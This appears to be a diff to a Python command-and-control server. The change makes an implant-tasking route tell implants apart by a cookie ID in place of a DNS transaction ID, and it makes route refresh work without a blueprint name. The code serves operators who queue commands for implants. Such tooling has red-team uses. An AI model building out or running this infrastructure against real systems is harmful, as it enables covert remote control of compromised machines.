@@ -455,12 +455,17 @@ def handle_client(client_socket, client_id):
                 logger.info("refreshing routes")
                 request_type, uname, token, bp_name, *message = client_request.split(" ", 4)
                 if token in operator_session_tokens:
-                    # Refresh the route status
-                    get_routes()
-                    # Register the user Blueprints
-                    register_blueprints(bp_name)
-                    logger.info("refreshed routes/blueprints")
-                    client_socket.send(f"Routes refreshed and Blueprints loaded :blue".encode())
+                    if bp_name == "":
+                        get_routes()
+                        logger.info("refreshed routes")
+                        client_socket.send(f"Routes refreshed :blue".encode())
+                    else:
+                        # Refresh the route status
+                        get_routes()
+                        # Register the user Blueprints
+                        register_blueprints(bp_name)
+                        logger.info("refreshed routes/blueprints")
+                        client_socket.send(f"Routes refreshed and Blueprints loaded :blue".encode())
                 else:
                     client_socket.send(f"Bad token :red".encode())
                     logger.error("bad token, couldn't refresh routes")
@@ -597,8 +602,9 @@ def register_routes():
             # Parse the DNS query using dnslib
             dns_packet = DNSRecord.parse(dns_query)
             header = dns_packet.header
-            transaction_id = header.id  # Transaction ID
-            logger.info(f"{transaction_id} sending us data")
+            transaction_id = header.id  # Transaction ID should always match the requests
+            get_imp_id = request.cookies.get('id')
+            # logger.info(f"{transaction_id} sending us data")
 
             # Create the response packet
             response_packet = DNSRecord(header)
@@ -621,7 +627,7 @@ def register_routes():
             # Get the data
             result = ' '.join(decoded_list)
             # Check which operator is waiting for a result
-            queue = implant_checkout[str(transaction_id)]
+            queue = implant_checkout[str(get_imp_id)]
             logger.info("got queue for operator")
             operator, set_command = queue.get()
             logger.info(f"sending {operator} command")
